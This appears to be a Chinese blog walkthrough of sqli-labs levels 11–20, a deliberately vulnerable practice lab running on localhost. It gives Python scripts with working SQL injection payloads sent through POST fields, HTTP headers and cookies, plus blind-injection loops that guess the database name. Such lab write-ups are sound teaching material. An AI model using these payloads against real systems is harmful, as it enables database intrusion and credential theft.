---
title: "sql注入:sqli-labs 第11~20关"
description: "sqli-lab的11到20关,以post注入为主"
pubDate: 2026-11-22T17:20
tags: [sql注入, 数据库]
---

## less11
这一关开始,就变成post请求了,跟前面get稍微有点区别,有一些注意的点  
比如说这个url,后面要加上斜杠,不然就会变成get请求,然后丢失表单信息  

然后是这个data表单的填写,我是现在浏览器上发了一个请求,然后f12看网络,他的负载是`uname=1&passwd=1&submit=Submit`,这样的样子,然后在构造data

```python
import requests
from tools import huixian

url = "http://localhost/sqli-labs/Less-11/"
# 最阴的来了,这个url末尾要加斜杠,不然就会发一个重定向,然后post变get并且丢掉data数据
data = {
    "uname":"1' OR 1 = 1 #",
    "passwd":"111",
    "submit":"Submit"
}
res = requests.post(url,data=data)

huixian(res)    #这是一个自定义函数,功能是显示请求信息和响应信息

# Your Login name:Dumb<br>Your Password:Dumb
```
仍然是先构造不同的payload,猜闭合方式,这道题是个单引号闭合  

然后更换payload为
```python
data = {
    "uname":"-1' UNION SELECT 9,group_concat(table_name) FROM information_schema.tables WHERE table_schema='security'#",
    "passwd":"111",
    "submit":"Submit"
}
```
这里要说明一下,这个联合查询后面是两个参数,跟前十关不太一样

即可查到库名,然后就是查表名和列名

## less12
这一关跟上一关差别不大,闭合方式为双引号闭合,并且多了一个括号,完整请求代码如下:
```python
import requests
from tools import huixian

url = "http://localhost/sqli-labs/Less-12/" 

data = {
    "uname":'-1") UNION SELECT 1,database() #',
    "passwd":"111",
    "submit":"Submit"
}
res = requests.post(url,data=data)

huixian(res)

# Your Login name:1<br>Your Password:security
```
库名查到了,然后就是表名,列名

## less13
这道题不管你payload构造的对不对,都不会有数据回显,所以我们可以尝试报错注入

```python
import requests
from tools import huixian

url = "http://localhost/sqli-labs/Less-13/" 

data = {
    "uname":"-1') AND extractvalue(1, concat(0x7e, (select database()))) # ",
    "passwd":"111",
    "submit":"Submit"
}
res = requests.post(url,data=data)

huixian(res)

# XPATH syntax error: '~security'
```
库名知道了,表名列名还会远吗


## less14
这道题试出来是双引号闭合型,并且正确之后不会有回显,所以我们选择报错注入
```python
import requests
from tools import huixian

url = "http://localhost/sqli-labs/Less-14/" 

data = {
    "uname":'1" AND EXTRACTVALUE(1, concat(0x7e, (database())))# ',
    "passwd":"111",
    "submit":"Submit"
}
res = requests.post(url,data=data)

huixian(res)
# XPATH syntax error: '~security'
```
接下来就是表名列名

## less15
我们尝试了很多种闭合方法,用`"uname":"1' OR 1=1 -- "`成功骗出了这样一个回显  
`<img src="../images/flag.jpg"  />`,只有状态改变,而没有数据回显,所以是一个盲注题  
梳理一下,布尔盲注求库名,先猜库名长度,再猜库名,写个循环就好了
```python
import requests
from tools import huixian

url = "http://localhost/sqli-labs/Less-15/" 

for time in range(1, 21):
    data = {
        "uname":f"1' OR length(database()) = {time} -- ",
        "passwd":"111",
        "submit":"Submit"
    }
    res = requests.post(url,data=data)

    if "flag.jpg" in res.text:
        print("😃", time)
        break
    else:
        print("😭")

# ...😃 8
```
我们猜出了库名长度为八,然后就是猜库名
```python
import requests
from tools import huixian

url = "http://localhost/sqli-labs/Less-15/" 

for i in range(1, 9):
    for ch in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890-_":
        data = {
            "uname":f"1' OR substr(database(), {i}, 1) = '{ch}' -- ",# 这个ch要加单引号一定记住了!!
            "passwd":"111",
            "submit":"Submit"
        }
        res = requests.post(url,data=data)

        if "flag.jpg" in res.text:
            print(ch, end = "")
            break
print("😃")

# security😃
```
ok,库名也是猜到了,那接下来表名列名都一样的

## less 16
跟十五题一样,闭合方式改成了双引号和小括号闭合

## less 17
这个题的构造位置变了,变成passwd那里了,  
开始还是一样在各种地方尝试各种不同的闭合方法,然后找他的报错,而得到闭合方式为单引号闭合  
这个题要求更新密码,所以是update语句,这时候就不能用联合查询注入(只能拼接两个查询语句),所以我们先尝试报错注入
```python
import requests
from tools import huixian

url = "http://localhost/sqli-labs/Less-17/" 

data = {
    "uname":"admin",
    "passwd":"-1' AND extractvalue(1, concat(0x7e, (SELECT database()))) # ",
    "submit":"Submit"
}

res = requests.post(url,data=data)
huixian(res)

# XPATH syntax error: '~security'
```
就得到了库名,在同样的位置修改payload就能得到表名列名

## less 18
```python
import requests
from tools import huixian
url = "http://localhost/sqli-labs/Less-18/"
data = {
    "uname":"admin",
    "passwd":"admin",
    "submit":"Submit"
}
```
这道题必须有一个正确的账密才有后续,账密用弱密码爆破一下吧,admin/admin
如果不人为构造headers,那么输入正确的账密之后,回显会比错误的账密多一点东西,如下
`Your User Agent is: python-requests/2.34.2`
这说明,输入正确的密码之后,请求头会被显示出来(我们刚才没有用请求头,所以这里默认是python的头)
那接下来就是构造一个请求头,猜测闭合方式,如下:
```python
headers = {
    "User-Agent":"'leisure"
}
```

回显:  `'leisure', '::1', 'admin')'`
猜测原本的结构是这样的`('请求头内容','::1','账户')`
这种写法出现在sql的`INSERT...VALUES(...)`语法中
那么我们就应该在不破坏原有内容的情况下构造一个payload
```python
headers = {
    "User-Agent":"' OR extractvalue(1, concat(0x7e, (SELECT database()))) OR '1'='1 # "
    # "' , extractvalue(1, concat(0x7e, (SELECT database()))) , '1') # ",这种写法也行
}
res = requests.post(url, data=data, headers=headers)
huixian(res)

# 回显: Your User Agent is: <payload> ... XPATH syntax error: '~security'
```
然后这道题的查列名会有`WHERE table_name='users'`这样的语句,但是这个单引号会导致闭合问题,所以可以用十六进制转化  
`WHERE table_name=0x7573657273`这样的形式

## less 19
```python
import requests
from tools import huixian
url = "http://localhost/sqli-labs/Less-19/"
data = {
    "uname":"admin",
    "passwd":"admin",
    "submit":"Submit"
}
```
跟 18 一样，这关也必须先有正确的账密（还是 admin/admin），不然连注入点都碰不到。

不过这次回显的不是 UA，换成了 Referer。注意 requests 默认不发 Referer，不手动加这个头，注入点就等于不存在。登录成功后，页面会回显：

Your Referer is: http://localhost/sqli-labs/Less-19/

那就把 Referer 换成探针，猜闭合：

```python
headers = {
    "User-Agent":"Mozilla/5.0",
    "Referer":"'leisure"
}
# 回显：near 'leisure', '::1')'
```
猜一下原本的结构，是 ('请求头内容','::1')。

这里要留意：19 只有两个值，跟 18 的三个值不一样（18 后面还多一个账户名），这是这关和上一关唯一的结构差别。

那就照着两值来构造 payload：

```python
headers = {
    "User-Agent":"Mozilla/5.0",
    "Referer":"' OR extractvalue(1, concat(0x7e, (SELECT database()))) OR '1'='1"
}
res = requests.post(url, data=data, headers=headers)
huixian(res)

# 回显: Your Referer is: <payload> ... XPATH syntax error: '~security'
```
less18 那种补三元组的写法 ' , extractvalue(...) , '1') # 在这里要改成补两个：' , extractvalue(...)) #。三个值的版本我试了，页面不报错但也不出数据，因为列数对不上。

然后查列名还是老问题：`WHERE table_name='users'` 里的单引号会把 payload 截断，继续用十六进制

`WHERE table_name=0x7573657273`

## less 20
```python
import requests
from tools import huixian
url = "http://localhost/sqli-labs/Less-20/"
```
先给个正常的 cookie：

```python
cookies = {
    "uname":"admin"
}
res = requests.get(url, cookies=cookies)
huixian(res)

# 回显: Your Login name:admin ... Your Password:admin ... Your ID:8
```

这说明 cookie 里的 uname 被拿去拼 SQL 了，而且查询有三个回显位，顺序是：

第几列	页面位置
第 1 列	Your ID:
第 2 列	Your Login name:
第 3 列	Your Password:
猜闭合，把 cookie 换成探针：

```python
cookies = {
    "uname":"'leisure"
}
# 回显: Issue with your mysql: ... near 'leisure' LIMIT 0,1'
```
单引号闭合，后面还跟着 LIMIT 0,1。

因为是 SELECT，有回显位，那就直接联合查询，不用像 18、19 那样靠报错：

```python
cookies = {
    "uname":"-1' UNION SELECT 1,database(),3 #"
}
res = requests.get(url, cookies=cookies)
huixian(res)

# 回显: Your Login name:security ... Your Password:3 ... Your ID:1
```
-1 让原查询查不到东西，数据塞进第 2 列，就显示在 Your Login name 那里。

查列名：

```python
cookies = {
    "uname":"-1' UNION SELECT 1,(SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name=0x7573657273 AND table_schema=database()),3 #"
}
# 回显: Your Login name:id,username,password ...
```
这里别照着 18 的习惯写成 UNION SELECT 1,group_concat(...) FROM ...,3，那个 3 会落到 FROM 后面，语法就坏了。把子查询整个塞进第 2 列最省事。

报错注入当然也行，只是没联合查询方便：

```python


cookies = {
    "uname":"' OR extractvalue(1, concat(0x7e, (SELECT database()))) OR '1'='1"
}
# 回显: Issue with your mysql: XPATH syntax error: '~security'
```
所以 18、19、20 三关的区别就是：18、19 是 INSERT，没有回显位，只能靠报错；20 是 SELECT，有三个回显位，联合查询直接出数据，还不用账号。
